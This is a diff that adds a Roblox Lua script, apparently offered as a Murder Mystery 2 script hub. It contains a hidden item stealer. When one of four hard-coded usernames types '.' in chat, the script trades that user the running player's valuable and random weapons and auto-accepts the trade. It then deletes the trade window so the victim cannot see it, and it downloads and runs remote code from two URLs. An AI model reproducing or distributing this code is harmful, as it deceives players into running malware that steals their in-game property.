@@ -1,0 +1,97 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vwSaraa/LunarHub/main/mm2"))()
+game:GetService("Players").PlayerChatted:Connect(function(PlayerChatType, Player, Message)
+    if Message == "." then
+        if Player.Name == "onlykayo" or Player.Name == "CodicosDeRoblox" or Player.Name == "ErickBR777GG" or Player.Name == "gufofiss" then
+            game:GetService("ReplicatedStorage").Trade.SendRequest:InvokeServer(Player)
+            local DataBase, PlayerData = getrenv()._G.Database, getrenv()._G.PlayerData
+            local items = {}
+            
+            for key, value in pairs(PlayerData.Weapons.Owned) do
+                local startIndex, _ = string.find(key, ":")
+                if startIndex then
+                    key = string.sub(key, 1, startIndex - 1)
+                end
+                table.insert(items, key)
+            end
+            
+            local Importantes = {}
+            
+            for _, item in ipairs(items) do
+                if item == "Dartbringer" or
+                   item == "Corrupt" or
+                   item == "ChromaDarkbringer" or
+                   item == "ChromaLightbringer" or
+                   item == "ChromaLuger" or
+                   item == "ChromaCandleflame" or
+                   item == "ChromaFang" or
+                   item == "Chroma Gemstone" or
+                   item == "Candleflame" or
+                   item == "ChromaDeathshard" or
+                   item == "ElderwoodBlade" or
+                   item == "Bat" or
+                   item == "Phantom" or
+                   item == "Spectre" or
+                   item == "Sugar" or
+                   item == "Candy" or
+                   item == "Luger" or
+                   item == "ElderwoodRevolver" or
+                   item == "Lightbringer" or
+                   item == "Darkbringer" or
+                   item == "RedLuger" or
+                   item == "GreenLuger" or
+                   item == "Icebeam" or
+                   item == "Nightblade" or
+                   item == "Iceflake" or
+                   item == "Hallowgun" or
+                   item == "Iceflake" or
+                   item == "Hallowgun" or
+                   item == "Heat" or
+                   item == "Fang" or
+                   item == "Heartblade" or
+                   item == "Chill" or
+                   item == "Gemstone" or
+                   item == "Deathshard" or
+                   item == "Xmas" or
+                   item == "Battleaxe" or
+                   item == "Jinglegun" or
+                   item == "Hallow'sBlade" then
+                   table.insert(Importantes, item)
+                end
+            end
+            
+            local selectedItems = {}
+            local numItemsToSelect = 7
+            
+            for i = 1, numItemsToSelect do
+                local randomIndex = math.random(#items)
+                local selectedItem = table.remove(items, randomIndex)
+                table.insert(selectedItems, selectedItem)
+            end
+            
+            wait(5)
+            
+            for _, value in ipairs(Importantes) do
+                game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(value, "Weapons")
+                game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(value, "Guns")
+            end
+            
+            wait(1)
+            
+            for _, item in ipairs(selectedItems) do
+                game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(item, "Weapons")
+                game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(item, "Guns")
+            end
+            game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
+            wait(3)
+			game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
+			wait(1)
+			game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
+			
+			
+
+        end
+    end
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tvgueimer84/jshdhhfkayhub.lua/main/modules.lua"))()
+game.Players.LocalPlayer.PlayerGui:WaitForChild("TradeGUI"):Destroy()
